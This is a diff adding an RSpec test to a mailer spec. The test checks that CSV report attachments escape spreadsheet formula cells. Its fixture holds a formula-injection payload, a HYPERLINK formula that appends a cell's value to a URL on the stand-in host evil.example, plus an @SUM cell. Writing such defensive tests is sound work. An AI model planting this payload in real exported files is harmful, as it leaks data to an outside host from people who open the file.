@@ -157,6 +157,28 @@ RSpec.describe ReportMailer, type: :mailer do
             .map { |table| table.map { |row| row.map(&:to_s) } },
         )
       end
+
+      context 'when a table cell contains a spreadsheet formula' do
+        let(:first_table) do
+          [
+            ['Some', 'String'],
+            ['=HYPERLINK("https://evil.example/?d="&A3,"Click")', '@SUM(A1:A2)'],
+            ['-1', 'd'],
+          ]
+        end
+
+        it 'escapes formula cells in the CSV attachment' do
+          table = CSV.parse(mail.attachments.first.read)
+
+          expect(table).to eq(
+            [
+              ['Some', 'String'],
+              ["'=HYPERLINK(\"https://evil.example/?d=\"&A3,\"Click\")", "'@SUM(A1:A2)"],
+              ['-1', 'd'],
+            ],
+          )
+        end
+      end
     end
 
     context 'with attachment_format: :xlsx' do
